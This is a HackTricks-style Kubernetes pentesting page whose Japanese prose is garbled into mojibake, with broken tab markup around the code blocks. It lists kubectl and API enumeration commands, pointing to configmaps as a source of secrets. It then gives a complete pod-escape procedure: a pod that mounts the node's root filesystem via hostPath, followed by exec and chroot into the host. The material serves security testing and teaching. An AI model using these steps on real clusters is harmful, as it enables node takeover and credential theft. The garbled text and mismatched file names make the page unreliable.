Kubernetesã®**ã‚µãƒ¼ãƒ“ã‚¹**ã¯ã€**ç‰¹å®šã®ãƒãƒ¼ãƒˆã¨IPã§ã‚µãƒ¼ãƒ“ã‚¹ã‚’å…¬é–‹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨**ã•ã‚Œã¾ã™ï¼ˆå®Ÿéš›ã«ã‚µãƒ¼ãƒ“ã‚¹ã‚’æä¾›ã—ã¦ã„ã‚‹ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦ãƒ­ãƒ¼ãƒ‰ãƒãƒ©ãƒ³ã‚µãƒ¼ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ï¼‰ã€‚ã“ã‚Œã¯ã€æ”»æ’ƒã‚’è©¦ã¿ã‚‹ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹å ´æ‰€ã‚’çŸ¥ã‚‹ãŸã‚ã«èˆˆå‘³æ·±ã„ã§ã™ã€‚
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### ãƒãƒ¼ãƒ‰ã®å–å¾—

ã‚¯ãƒ©ã‚¹ã‚¿å†…ã«æ§‹æˆã•ã‚ŒãŸã™ã¹ã¦ã®**ãƒãƒ¼ãƒ‰**ã‚’å–å¾—ã—ã¾ã™ã€‚
```
k get nodes
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆã®å–å¾—

**ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆ**ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰ï¼ˆã¾ãŸã¯é¸æŠã•ã‚ŒãŸãƒãƒ¼ãƒ‰ï¼‰ã§**ç‰¹å®šã®ãƒãƒƒãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèª**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆã‚’å‰Šé™¤ã™ã‚‹ã¨ã€ãã‚Œã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã¦ã„ã‚‹ãƒãƒƒãƒ‰ã‚‚å‰Šé™¤ã•ã‚Œã¾ã™ã€‚
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### cronjobã®å–å¾—

Cronã‚¸ãƒ§ãƒ–ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€crontabã®ã‚ˆã†ãªæ§‹æ–‡ã‚’ä½¿ç”¨ã—ã¦ã€ç‰¹å®šã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ãƒãƒƒãƒ‰ã®èµ·å‹•ã‚’ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### configMapã®å–å¾—

configMapã«ã¯å¸¸ã«å¤šãã®æƒ…å ±ã¨configfileãŒå«ã¾ã‚Œã¦ãŠã‚Šã€kubernetesã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«æä¾›ã•ã‚Œã¾ã™ã€‚é€šå¸¸ã€ä»–ã®å†…éƒ¨/å¤–éƒ¨ã‚µãƒ¼ãƒ“ã‚¹ã«æ¥ç¶šã—ã¦æ¤œè¨¼ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹å¤šãã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã€ãƒˆãƒ¼ã‚¯ãƒ³ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ã€‚
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### "all"ã‚’å–å¾—ã™ã‚‹

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **ãƒãƒƒãƒ‰ã®æ¶ˆè²»é‡ã‚’å–å¾—ã™ã‚‹**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### ãƒãƒƒãƒ‰ã‹ã‚‰ã®è„±å‡º

æ–°ã—ã„ãƒãƒƒãƒ‰ã‚’ä½œæˆã§ãã‚‹å ´åˆã€ãã‚Œã‚‰ã‹ã‚‰ãƒãƒ¼ãƒ‰ã«è„±å‡ºã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãã®ãŸã‚ã«ã¯ã€yamlãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½¿ç”¨ã—ã¦æ–°ã—ã„ãƒãƒƒãƒ‰ã‚’ä½œæˆã—ã€ä½œæˆã—ãŸãƒãƒƒãƒ‰ã«åˆ‡ã‚Šæ›¿ãˆã¦ã‹ã‚‰ã€ãƒãƒ¼ãƒ‰ã®ã‚·ã‚¹ãƒ†ãƒ ã«chrootã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æ—¢å­˜ã®ãƒãƒƒãƒ‰ã‚’yamlãƒ•ã‚¡ã‚¤ãƒ«ã®å‚ç…§ã¨ã—ã¦ä½¿ç”¨ã§ãã¾ã™ã€‚ãªãœãªã‚‰ã€ãã‚Œã‚‰ã¯æ—¢å­˜ã®ã‚¤ãƒ¡ãƒ¼ã‚¸ã¨ãƒ‘ã‚¹ã‚’è¡¨ç¤ºã—ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> ç‰¹å®šã®ãƒãƒ¼ãƒ‰ã«ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒãƒ¼ãƒ‰ã®ãƒ©ãƒ™ãƒ«ã‚’å–å¾—ã§ãã¾ã™
>
> `k get nodes --show-labels`
>
> ä¸€èˆ¬çš„ã«ã€kubernetes.io/hostname ã¨ node-role.kubernetes.io/master ã¯é¸æŠã™ã‚‹ã®ã«é©ã—ãŸãƒ©ãƒ™ãƒ«ã§ã™ã€‚
>
> [reference]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

ãã®å¾Œã€attack.yaml ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã¾ã™
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[å…ƒã®yamlã‚½ãƒ¼ã‚¹](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

ãã®å¾Œã€ãƒãƒƒãƒ‰ã‚’ä½œæˆã—ã¾ã™ã€‚
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
ä»Šå¾Œã€ä½œæˆã—ãŸãƒãƒƒãƒ‰ã«åˆ‡ã‚Šæ›¿ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
ãã—ã¦æœ€å¾Œã«ã€ãƒãƒ¼ãƒ‰ã®ã‚·ã‚¹ãƒ†ãƒ ã«chrootã—ã¾ã™ã€‚
```bash
chroot /root /bin/bash
```
æƒ…å ±å–å¾—å…ƒï¼š[Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube â€“ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## å‚è€ƒæ–‡çŒ®

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
